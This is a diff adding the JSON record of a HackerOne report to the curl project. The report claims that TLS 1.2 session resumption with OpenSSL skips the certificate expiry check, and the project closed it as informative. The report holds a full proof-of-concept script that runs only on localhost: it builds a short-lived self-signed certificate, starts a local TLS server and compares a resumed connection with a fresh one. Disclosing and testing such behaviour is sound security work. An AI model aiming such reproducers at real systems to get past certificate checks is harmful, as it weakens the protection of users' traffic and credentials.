@@ -1,0 +1,106 @@
+{
+  "id": 3781305,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzgxMzA1",
+  "url": "https://hackerone.com/reports/3781305",
+  "title": "OpenSSL TLS 1.2 session resumption accepts expired server certificates in libcurl",
+  "state": "Closed",
+  "substate": "informative",
+  "readable_substate": "Informative",
+  "created_at": "2026-06-04T06:03:08.017Z",
+  "submitted_at": "2026-06-04T06:03:08.527Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "awofjawofjfawf",
+    "url": "/awofjawofjfawf",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-07T12:34:36.986Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-06-05T07:17:08.429Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\ncurl's OpenSSL backend can accept a new TLS 1.2 HTTPS connection after the\nserver certificate has expired if the connection resumes a previously cached TLS\nsession. A full handshake made at the same time with the same certificate fails\nwith `CURLE_PEER_FAILED_VERIFICATION`, but the resumed connection returns\n`CURLE_OK`. The resumed path installs the cached session with `SSL_set_session()`\nand relies on OpenSSL's cached `X509_V_OK` verify result instead of rechecking\nthe peer certificate validity against the current time. Hostname verification is\nstill performed, but the certificate expiration check is bypassed for the\nresumed TLS 1.2 connection. Disabling libcurl's SSL session cache makes the same\npost-expiration connection fail as expected.\n\n### Affected Version\n\nI reproduced this against a current curl git checkout using the OpenSSL TLS\nbackend. The proof of concept prints the curl/OpenSSL version at runtime. The\nissue requires the OpenSSL or QuicTLS backend and TLS 1.2 session resumption;\nTLS 1.3 behavior is intentionally not the target of this report.\n\nRelevant code paths:\n\n- `lib/vtls/openssl.c`: cached TLS session is installed with `SSL_set_session()`\n- `lib/vtls/openssl.c`: resumed session is accepted when `SSL_get_verify_result()` is `X509_V_OK`\n- `lib/vtls/openssl.c`: later verification again uses the same cached OpenSSL verify result\n- `lib/vtls/vtls_scache.c`: TLS 1.2 sessions are retained in libcurl's session cache\n\n### Project Documentation Fit\n\nThis should be treated as a curl/libcurl security issue rather than API misuse\nor a documented limitation:\n\n- `CURLOPT_SSL_VERIFYPEER` is enabled by default and documents that certificate\n  verification failures make the TLS connection fail.\n- `CURLOPT_SSL_SESSIONID_CACHE` is enabled by default. The documented purpose is\n  session reuse, not relaxing current certificate validity checks.\n- `docs/internals/TLS-SESSIONS.md` warns against persisting TLS 1.2 tickets and\n  documents a CA-file-content caveat for persisted sessions. The PoC below does\n  not rely on persistence, local file replacement, invalid parameters, or\n  application API misuse. It uses one normal curl command line, an unchanged\n  trust anchor, and curl's default in-memory session cache.\n\n### Steps To Reproduce\n\nPrerequisites: `bash`, `python3` with the `cryptography` package, and a curl\nbinary built with OpenSSL or QuicTLS. Optionally set `CURL_BIN=/path/to/curl`\nto test a local build.\n\nCopy and paste the following as one command:\n\n```bash\nbash <<'EOF'\nset -euo pipefail\nCURL_BIN=\"${CURL_BIN:-curl}\"\n\ncommand -v \"$CURL_BIN\" >/dev/null 2>&1 || {\n  echo \"missing curl binary: $CURL_BIN\" >&2\n  exit 1\n}\ncommand -v python3 >/dev/null 2>&1 || {\n  echo \"missing required command: python3\" >&2\n  exit 1\n}\n\npython3 - <<'PY'\ntry:\n    import cryptography  # noqa: F401\nexcept Exception as e:\n    raise SystemExit(\"missing python package 'cryptography': %s\" % e)\nPY\n\nWORK=\"$(mktemp -d /tmp/curl-cmd-resume-expiry.XXXXXX)\"\nSRV_PID=\"\"\ncleanup() {\n  if [ -n \"$SRV_PID\" ]; then\n    kill \"$SRV_PID\" 2>/dev/null || true\n    wait \"$SRV_PID\" 2>/dev/null || true\n  fi\n  rm -rf \"$WORK\"\n}\ntrap cleanup EXIT\n\nPORT=\"$(python3 - <<'PY'\nimport socket\ns = socket.socket()\ns.bind((\"127.0.0.1\", 0))\nprint(s.getsockname()[1])\ns.close()\nPY\n)\"\nexport WORK PORT\n\npython3 - <<'PY'\nimport os\nfrom datetime import datetime, timedelta, timezone\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\nwork = os.environ[\"WORK\"]\nnow = datetime.now(timezone.utc)\nexpiry = now + timedelta(seconds=3)\nbackend = default_backend()\n\nkey = rsa.generate_private_key(public_exponent=65537, key_size=2048,\n                               backend=backend)\nname = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \"localhost\")])\ncert = (\n    x509.CertificateBuilder()\n    .subject_name(name)\n    .issuer_name(name)\n    .public_key(key.public_key())\n    .serial_number(x509.random_serial_number())\n    .not_valid_before(now - timedelta(minutes=1))\n    .not_valid_after(expiry)\n    .add_extension(x509.SubjectAlternativeName([x509.DNSName(\"localhost\")]),\n                   critical=False)\n    .sign(key, hashes.SHA256(), backend)\n)\n\nwith open(os.path.join(work, \"server.pem\"), \"wb\") as f:\n    f.write(cert.public_bytes(serialization.Encoding.PEM))\nwith open(os.path.join(work, \"server.key\"), \"wb\") as f:\n    f.write(key.private_bytes(serialization.Encoding.PEM,\n                              serialization.PrivateFormat.TraditionalOpenSSL,\n                              serialization.NoEncryption()))\nprint(\"certificate_expires_at=%s\" % expiry.isoformat())\nPY\n\ncat >\"$WORK/server.py\" <<'PY'\nimport os\nimport socket\nimport ssl\nimport time\n\nport = int(os.environ[\"PORT\"])\nwork = os.environ[\"WORK\"]\n\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.minimum_version = ssl.TLSVersion.TLSv1_2\nctx.maximum_version = ssl.TLSVersion.TLSv1_2\nctx.load_cert_chain(os.path.join(work, \"server.pem\"),\n                    os.path.join(work, \"server.key\"))\n\nls = socket.socket()\nls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nls.bind((\"127.0.0.1\", port))\nls.listen(5)\nprint(\"server_ready\", flush=True)\n\nfor i in range(3):\n    raw, _ = ls.accept()\n    if i == 1:\n        print(\"conn2_delay_before_handshake=5s\", flush=True)\n        time.sleep(5)\n    try:\n        ssock = ctx.wrap_socket(raw, server_side=True)\n    except Exception as e:\n        print(\"conn%d_handshake_error=%s:%s\" %\n              (i + 1, type(e).__name__, e), flush=True)\n        raw.close()\n        continue\n\n    print(\"conn%d_reused=%s\" %\n          (i + 1, getattr(ssock, \"session_reused\", None)), flush=True)\n    data = b\"\"\n    while b\"\\r\\n\\r\\n\" not in data:\n        chunk = ssock.recv(4096)\n        if not chunk:\n            break\n        data += chunk\n    body = (\"hello %d\\n\" % (i + 1)).encode()\n    ssock.sendall(b\"HTTP/1.1 200 OK\\r\\nContent-Length: \" +\n                  str(len(body)).encode() +\n                  b\"\\r\\nConnection: close\\r\\n\\r\\n\" + body)\n    try:\n        ssock.unwrap()\n    except Exception:\n        pass\n    ssock.close()\n\nls.close()\nprint(\"server_done\", flush=True)\nPY\n\npython3 \"$WORK/server.py\" >\"$WORK/server.log\" 2>&1 &\nSRV_PID=$!\nfor _ in $(seq 1 100); do\n  grep -q server_ready \"$WORK/server.log\" && break\n  sleep 0.05\ndone\ngrep -q server_ready \"$WORK/server.log\" || {\n  echo \"TLS test server did not start\" >&2\n  cat \"$WORK/server.log\" >&2\n  exit 1\n}\n\n\"$CURL_BIN\" -V | head -1\nif ! \"$CURL_BIN\" -V | head -1 | grep -Eq 'OpenSSL|QuicTLS'; then\n  echo \"This PoC needs a curl binary using the OpenSSL or QuicTLS backend.\" >&2\n  exit 77\nfi\n\nURL=\"https://localhost:$PORT/\"\n\n# One curl process, two URLs. The server closes the first connection, so curl\n# opens a new TLS connection for the second URL while keeping its in-process\n# TLS session cache.\n\"$CURL_BIN\" -sS -v \\\n  --cacert \"$WORK/server.pem\" \\\n  --tlsv1.2 --tls-max 1.2 \\\n  --connect-timeout 10 --max-time 30 \\\n  \"$URL\" \"$URL\" \\\n  >\"$WORK/two.out\" 2>\"$WORK/two.err\" || true\n\nset +e\n\"$CURL_BIN\" -sS -v \\\n  --cacert \"$WORK/server.pem\" \\\n  --tlsv1.2 --tls-max 1.2 \\\n  --connect-timeout 10 --max-time 15 \\\n  --no-sessionid \\\n  \"$URL\" \\\n  >\"$WORK/fresh.out\" 2>\"$WORK/fresh.err\"\nFRESH=$?\nset -e\n\nwait \"$SRV_PID\" 2>/dev/null || true\nSRV_PID=\"\"\n\necho \"=== two-url curl stdout ===\"\ncat \"$WORK/two.out\"\necho \"=== fresh curl exit ===\"\necho \"$FRESH\"\necho \"=== relevant curl verbose lines ===\"\ngrep -E \"SSL reusing session|certificate has expired|OpenSSL verify result|SSL verify result|SSL certificate verified|SSL certificate verify ok\" \\\n  \"$WORK/two.err\" \"$WORK/fresh.err\" || true\necho \"=== server log ===\"\ncat \"$WORK/server.log\"\n\nif grep -q 'hello 1' \"$WORK/two.out\" &&\n   grep -q 'hello 2' \"$WORK/two.out\" &&\n   [ \"$FRESH\" = 60 ] &&\n   grep -q 'conn2_reused=True' \"$WORK/server.log\"; then\n  echo \"VULNERABLE: resumed connection succeeds after expiry while fresh full handshake fails\"\nelse\n  echo \"NOT REPRODUCED\" >&2\n  exit 1\nfi\nEOF\n```\n\nExpected output contains:\n\n```text\ncurl 8.x.x ... OpenSSL/...\n=== two-url curl stdout ===\nhello 1\nhello 2\n=== fresh curl exit ===\n60\nconn2_reused=True\nVULNERABLE: resumed connection succeeds after expiry while fresh full handshake fails\n```\n\nThe first URL in the two-URL curl command establishes a TLS 1.2 session while\nthe self-signed test certificate is still valid and explicitly trusted with\n`--cacert`. The server delays the second TLS handshake until after that\ncertificate expires. curl then opens a new TLS connection for the second URL,\nresumes the cached TLS 1.2 session, and accepts it. The final separate curl\ncommand is the control: it uses `--no-sessionid` and performs a fresh handshake\nafter the certificate has expired, which fails with exit code 60.\n\n## Impact\n\n## Summary:\nAn endpoint that had a certificate valid at the time of the first connection\ncan continue to be accepted for new HTTPS connections after that certificate\nexpires, as long as the client resumes the previously cached TLS 1.2 session.\nThis weakens curl's default certificate expiration enforcement: the same\ncertificate is rejected by a fresh full handshake but accepted by the resumed\nconnection path.\n\nThe practical attack window is bounded by libcurl's session cache lifetime and\nby whether the server still accepts the TLS 1.2 session ticket or session ID.\nThis can affect applications that reuse an easy handle, use a multi handle, or\nshare the TLS session cache. It can also affect imported/persisted TLS sessions,\nalthough persistence of TLS 1.2 tickets is a weaker secondary scenario because\ncurl documentation already discourages persisting TLS 1.2 tickets.\n\nSensitive HTTP requests, headers, cookies, and credentials may then be sent over\na TLS connection that would not pass current certificate validation if the\nsession were not resumed.",
+  "weakness": {
+    "id": 556,
+    "name": "Improper Validation of Certificate Expiration"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
